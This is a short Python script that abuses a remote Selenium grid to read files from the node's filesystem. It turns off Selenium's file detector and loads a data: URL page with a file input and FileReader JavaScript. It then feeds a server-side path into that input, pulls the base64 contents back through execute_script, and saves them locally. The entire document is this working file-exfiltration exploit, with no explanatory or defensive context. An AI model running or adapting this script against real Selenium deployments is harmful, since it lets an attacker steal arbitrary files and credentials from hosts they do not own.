import base64
from selenium import webdriver
from selenium.webdriver.remote.file_detector import UselessFileDetector

file_get = '/tmp/jonwashere.txt'
local_file = './jonwashere.txt'

driver = webdriver.Remote(
   command_executor="http://selenium:4444/wd/hub",
   desired_capabilities={"browserName": "firefox"}
   )
driver.file_detector = UselessFileDetector()

try:
    # A simple file input plus some FileReader js to store file contents in "inf"
    driver.get('data:text/html;charset=utf-8,<html><input id=f type=file onchange="rf(event)"><script>var inf; var rf = function(e) { var inp = e.target; var read = new FileReader(); read.onload = function(){inf = read.result;}; read.readAsDataURL(inp.files[0]);}</script></html>')
    try:
        driver.find_element_by_id('f').send_keys(file_get) # Load local file into input field (and therefor "inf")
        js_return = driver.execute_script('return(inf)')   # Dump the contents of "inf"
        if js_return:
            try:
                encoding, contents = js_return.split(',')
                if local_file:
                    f = open(local_file, 'w+b')
                    f.write(base64.b64decode(contents))
                    f.close()
                else:
                    print(base64.b64decode(contents))
            except:
                print('Cannot Decode: %s' % js_return)
        else:
            print('Cannot Read: %s' % file_get)
    except:
        print('Doesnt Exist: %s' % file_get)
finally:
    driver.quit()
